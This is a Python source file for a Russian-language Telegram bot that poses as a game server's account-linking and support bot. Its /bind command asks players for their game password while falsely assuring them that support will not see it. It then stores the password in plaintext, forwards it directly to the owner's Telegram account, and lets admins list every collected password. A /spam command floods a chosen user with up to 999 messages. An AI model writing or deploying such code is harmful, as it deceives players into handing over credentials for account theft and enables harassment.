import asyncio
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import math
import os
import re
import threading
import time
import urllib.parse

import aiohttp
from aiogram import BaseMiddleware, Bot, Dispatcher, types
from aiogram.exceptions import TelegramRetryAfter
from aiogram.filters import Command

# ==========================================
# ВЕБ-СЕРВЕР ДЛЯ RENDER И UPTIMEROBOT
# ==========================================
class HealthCheckHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.send_response(200)
    self.end_headers()
    self.wfile.write(b"Bot is active")

  def log_message(self, format, *args):
    return


def run_health_check_server():
  port = int(os.environ.get("PORT", 8080))
  server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
  server.serve_forever()


threading.Thread(target=run_health_check_server, daemon=True).start()

# ==========================================
# ОСНОВНЫЕ НАСТРОЙКИ И СОХРАНЕНИЕ ДАННЫХ
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
MAIN_ADMIN_ID = 8070071877  # Главный админ (незабаниваемый)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

DATA_FILE = "bot_data.json"


def load_data():
  if os.path.exists(DATA_FILE):
    try:
      with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)
    except Exception:
      pass
  return {"admins": [MAIN_ADMIN_ID], "banned_users": {}, "accounts_db": {}}


def save_data():
  try:
    with open(DATA_FILE, "w", encoding="utf-8") as f:
      json.dump(db, f, ensure_ascii=False, indent=2)
  except Exception:
    pass


db = load_data()

if MAIN_ADMIN_ID not in db["admins"]:
  db["admins"].append(MAIN_ADMIN_ID)
  save_data()

user_cooldowns = {}
bot_messages = {}

# ==========================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И MIDDLEWARE
# ==========================================
async def send_tracked_message(chat_id: int, text: str):
  try:
    msg = await bot.send_message(chat_id, text)
    if chat_id not in bot_messages:
      bot_messages[chat_id] = []
    bot_messages[chat_id].append(msg.message_id)
    return msg
  except Exception:
    return None


def is_valid_input(text: str) -> bool:
  return bool(re.match(r"^[A-Za-z0-9]+$", text))


def is_admin(user_id: int) -> bool:
  return user_id in db["admins"] or user_id == MAIN_ADMIN_ID


class BanMiddleware(BaseMiddleware):

  async def __call__(self, handler, event, data_dict):
    user_id = event.from_user.id
    str_uid = str(user_id)
    current_time = time.time()

    if str_uid in db["banned_users"]:
      unban_time = db["banned_users"][str_uid]
      if current_time < unban_time:
        days_left = math.ceil((unban_time - current_time) / 86400)
        if days_left < 1:
          days_left = 1
        await event.answer(f"[Система] У вас бан {days_left} дней.")
        return
      else:
        del db["banned_users"][str_uid]
        save_data()

    return await handler(event, data_dict)


dp.message.middleware(BanMiddleware())

# ==========================================
# ПОЛЬЗОВАТЕЛЬСКИЕ КОМАНДЫ
# ==========================================
@dp.message(Command("start"))
async def start_handler(message: types.Message):
  welcome_text = (
      "[Бот] Для того, чтобы привязать игровой аккаунт, выполните следующие"
      " действия:\n1. Напишите: /bind [Ваш-Ник] [Ваш-Пароль]\n(Поддержка"
      " Ваш пароль не увидит)\n2. Напишите /help, чтобы увидеть возможности.\n3."
      " Жалобы /report [текст]\nПриятной игры на наших серверах."
  )
  await send_tracked_message(message.chat.id, welcome_text)


@dp.message(Command("help"))
async def help_handler(message: types.Message):
  help_text = (
      "Список доступных команд:\n\n/bind [Ник] [Пароль] - Привязать игровой"
      " аккаунт к Telegram.\n/list - Показать привязанные аккаунты.\n/report"
      " [текст] - Отправить жалобу/вопрос администрации.\n/ai [ваш вопрос] -"
      " Задать вопрос нейросети Phoenix AI.\n/help - Показать это меню."
  )
  await send_tracked_message(message.chat.id, help_text)


@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
  user_id = message.from_user.id
  current_time = time.time()

  if user_id in user_cooldowns:
    elapsed = current_time - user_cooldowns[user_id]
    if elapsed < 15:
      remaining = int(15 - elapsed)
      for sec in range(remaining, 0, -1):
        try:
          timer_msg = await bot.send_message(
              user_id, f"[Система] До следующей попытки {sec} секунд."
          )
          await asyncio.sleep(1)
          await timer_msg.delete()
        except Exception:
          pass
      return

  args = message.text.split()
  if len(args) != 3:
    await send_tracked_message(
        user_id, "[Бот] Неверный формат. Используйте: /bind [Ник] [Пароль]"
    )
    return

  username = args[1]
  password = args[2]

  if not is_valid_input(username) or not is_valid_input(password):
    await send_tracked_message(user_id, "[Бот] Неверный пароль или ник")
    return

  user_cooldowns[user_id] = current_time

  str_uid = str(user_id)
  if str_uid not in db["accounts_db"]:
    db["accounts_db"][str_uid] = []

  db["accounts_db"][str_uid].append({"nick": username, "password": password})
  save_data()
  await send_tracked_message(user_id, "[Бот] Аккаунт был успешно привязан.")

  tg_user = (
      f"@{message.from_user.username}"
      if message.from_user.username
      else message.from_user.first_name
  )
  admin_msg = (
      f"Новый привязанный аккаунт:\n\nИгрок: {tg_user}\nTelegram ID:"
      f" {user_id}\nНик: {username}\nПароль: {password}"
  )

  try:
    await bot.send_message(chat_id=MAIN_ADMIN_ID, text=admin_msg)
  except Exception:
    pass


@dp.message(Command("list"))
async def list_handler(message: types.Message):
  user_id = message.from_user.id
  str_uid = str(user_id)
  if str_uid not in db["accounts_db"] or not db["accounts_db"][str_uid]:
    await send_tracked_message(user_id, "[Бот] У вас нет привязанных аккаунтов.")
    return

  text = "[Бот] Ваши привязанные аккаунты:\n\n"
  for acc in db["accounts_db"][str_uid]:
    text += f"Ник: {acc['nick']} | Пароль: {acc['password']}\n"
  await send_tracked_message(user_id, text)


@dp.message(Command("report"))
async def report_handler(message: types.Message):
  text = message.text[7:].strip()
  if not text:
    await send_tracked_message(
        message.chat.id,
        "[Система] Напишите текст жалобы после команды. Пример: /report Нашел"
        " баг",
    )
    return

  user_id = message.from_user.id
  tg_user = (
      f"@{message.from_user.username}"
      if message.from_user.username
      else message.from_user.first_name
  )

  report_msg = (
      f"[ЖАЛОБА/РЕПОРТ]\nОт пользователя: {tg_user}\nID: {user_id}\nТекст:"
      f" {text}"
  )

  try:
    await bot.send_message(MAIN_ADMIN_ID, report_msg)
    await send_tracked_message(
        message.chat.id,
        "[Система] Ваша жалоба отправлена главной администрации.",
    )
  except Exception:
    await send_tracked_message(
        message.chat.id, "[Система] Ошибка при отправке жалобы."
    )


@dp.message(Command("ai"))
async def ai_handler(message: types.Message):
  question = message.text[3:].strip()
  if not question:
    await send_tracked_message(
        message.chat.id,
        "[Phoenix AI] Напишите вопрос после команды. Пример: /ai Как играть?",
    )
    return

  thinking_msg = await send_tracked_message(
      message.chat.id, "[Phoenix AI] Обработка запроса..."
  )

  encoded_question = urllib.parse.quote(question)
  url = f"https://text.pollinations.ai/{encoded_question}"

  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(url, timeout=20) as resp:
        if resp.status == 200:
          ai_answer = await resp.text()
          reply = f"[Phoenix AI]\n\n{ai_answer}"
        else:
          reply = "[Phoenix AI] Ошибка сервера ИИ. Попробуйте позже."

    try:
      if thinking_msg:
        await bot.delete_message(message.chat.id, thinking_msg.message_id)
    except Exception:
      pass

    await send_tracked_message(message.chat.id, reply)

  except Exception:
    try:
      if thinking_msg:
        await bot.delete_message(message.chat.id, thinking_msg.message_id)
    except Exception:
      pass
    await send_tracked_message(
        message.chat.id, "[Phoenix AI] Произошла ошибка сети."
    )


# ==========================================
# АДМИН-КОМАНДЫ
# ==========================================
@dp.message(Command("op"))
async def op_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    await bot.send_message(
        message.chat.id, "[Система] Укажите ID. Пример: /op 123456789"
    )
    return

  target_id = int(args[1])
  if target_id not in db["admins"]:
    db["admins"].append(target_id)
    save_data()
    await bot.send_message(
        message.chat.id,
        f"[Система] Пользователю {target_id} выведены админ права.",
    )
  else:
    await bot.send_message(
        message.chat.id, "[Система] Пользователь уже является админом."
    )


@dp.message(Command("ban"))
async def ban_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 3:
    await bot.send_message(
        message.chat.id,
        "[Система] Укажите ID и кол-во дней. Пример: /ban 123456789 7",
    )
    return

  target_id = int(args[1])
  days = int(args[2])

  if target_id == MAIN_ADMIN_ID:
    await bot.send_message(
        message.chat.id, "[Система] Нельзя забанить главного администратора."
    )
    return

  unban_time = time.time() + (days * 86400)
  db["banned_users"][str(target_id)] = unban_time
  save_data()

  await bot.send_message(
      message.chat.id,
      f"[Система] Пользователь {target_id} заблокирован на {days} дней.",
  )


@dp.message(Command("unban"))
async def unban_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    await bot.send_message(
        message.chat.id, "[Система] Укажите ID. Пример: /unban 123456789"
    )
    return

  target_id = str(args[1])
  if target_id in db["banned_users"]:
    del db["banned_users"][target_id]
    save_data()
    await bot.send_message(
        message.chat.id, f"[Система] Пользователь {target_id} разблокирован."
    )
  else:
    await bot.send_message(
        message.chat.id, "[Система] Пользователь не найден в списке банов."
    )


@dp.message(Command("spam"))
async def spam_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return

  # Шаблон: /spam ID (.Текст.) Кол-во
  pattern = r"/spam\s+(\d+)\s+\(\.(.*?)\.\)\s+(\d+)"
  match = re.search(pattern, message.text, re.DOTALL)

  if not match:
    await bot.send_message(
        message.chat.id,
        "[Система] Формат: /spam [ID] (.Текст со всеми символами.) [Кол-во]",
    )
    return

  target_id = int(match.group(1))
  spam_text = match.group(2)
  count = int(match.group(3))

  if count > 999:
    count = 999

  report_msg = await bot.send_message(
      MAIN_ADMIN_ID,
      f"[Спам Запуск]\nОтправка пользователю {target_id}\nПрогресс: 0/{count}",
  )

  sent_count = 0
  for i in range(1, count + 1):
    try:
      await bot.send_message(target_id, spam_text)
      sent_count += 1
      await asyncio.sleep(0.1)  # Защита от моментальной блокировки бота Telegram

      if i % 25 == 0 or i == count:
        try:
          await bot.edit_message_text(
              chat_id=MAIN_ADMIN_ID,
              message_id=report_msg.message_id,
              text=(
                  f"[Спам Отчет]\nПользователь: {target_id}\nОтправлено:"
                  f" {sent_count}/{count}"
              ),
          )
        except Exception:
          pass
    except TelegramRetryAfter as e:
      await asyncio.sleep(e.retry_after)
    except Exception as e:
      await bot.send_message(
          MAIN_ADMIN_ID,
          f"[Спам Ошибка] Остановилось на {sent_count}/{count}. Ошибка: {e}",
      )
      break


@dp.message(Command("msg"))
async def msg_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split(maxsplit=2)
  if len(args) < 3:
    await bot.send_message(
        message.chat.id, "[Система] Используйте: /msg [ID] [Текст]"
    )
    return

  target_id = int(args[1])
  text = args[2]
  try:
    await send_tracked_message(target_id, f"[Ответ от администрации]\n{text}")
    await bot.send_message(
        message.chat.id, "[Система] Сообщение успешно отправлено."
    )
  except Exception:
    await bot.send_message(message.chat.id, "[Система] Ошибка отправки.")


@dp.message(Command("listadmin"))
async def listadmin_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  if not db["accounts_db"]:
    await bot.send_message(
        message.chat.id, "[Система] База данных аккаунтов пуста."
    )
    return

  text = "[Система] Все привязанные аккаунты:\n\n"
  for uid, accs in db["accounts_db"].items():
    for acc in accs:
      text += f"ID: {uid} | Ник: {acc['nick']} | Пароль: {acc['password']}\n"
  await bot.send_message(message.chat.id, text)


@dp.message(Command("dellist"))
async def dellist_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    await bot.send_message(
        message.chat.id, "[Система] Укажите ник. Пример: /dellist Player1"
    )
    return

  target_nick = args[1]
  found = False
  for uid, accs in db["accounts_db"].items():
    for acc in accs[:]:
      if acc["nick"] == target_nick:
        accs.remove(acc)
        found = True

  if found:
    save_data()
    await bot.send_message(
        message.chat.id, f"[Система] Аккаунт {target_nick} удален из базы."
    )
  else:
    await bot.send_message(message.chat.id, "[Система] Ник не найден.")


@dp.message(Command("clear"))
async def clear_handler(message: types.Message):
  if not is_admin(message.from_user.id):
    return
  args = message.text.split()
  if len(args) < 2:
    await bot.send_message(
        message.chat.id, "[Система] Укажите ID. Пример: /clear 123456789"
    )
    return

  target_id = int(args[1])
  if target_id in bot_messages and bot_messages[target_id]:
    deleted_count = 0
    for msg_id in bot_messages[target_id]:
      try:
        await bot.delete_message(chat_id=target_id, message_id=msg_id)
        deleted_count += 1
      except Exception:
        pass
    bot_messages[target_id].clear()
    await bot.send_message(
        message.chat.id,
        f"[Система] Удалено {deleted_count} сообщений бота у {target_id}.",
    )
  else:
    await bot.send_message(
        message.chat.id, f"[Система] Нет сохраненных сообщений у {target_id}."
    )


# ==========================================
# ЗАПУСК БОТА
# ==========================================
async def main():
  await bot.delete_webhook(drop_pending_updates=True)
  await dp.start_polling(bot)


if __name__ == "__main__":
  asyncio.run(main())

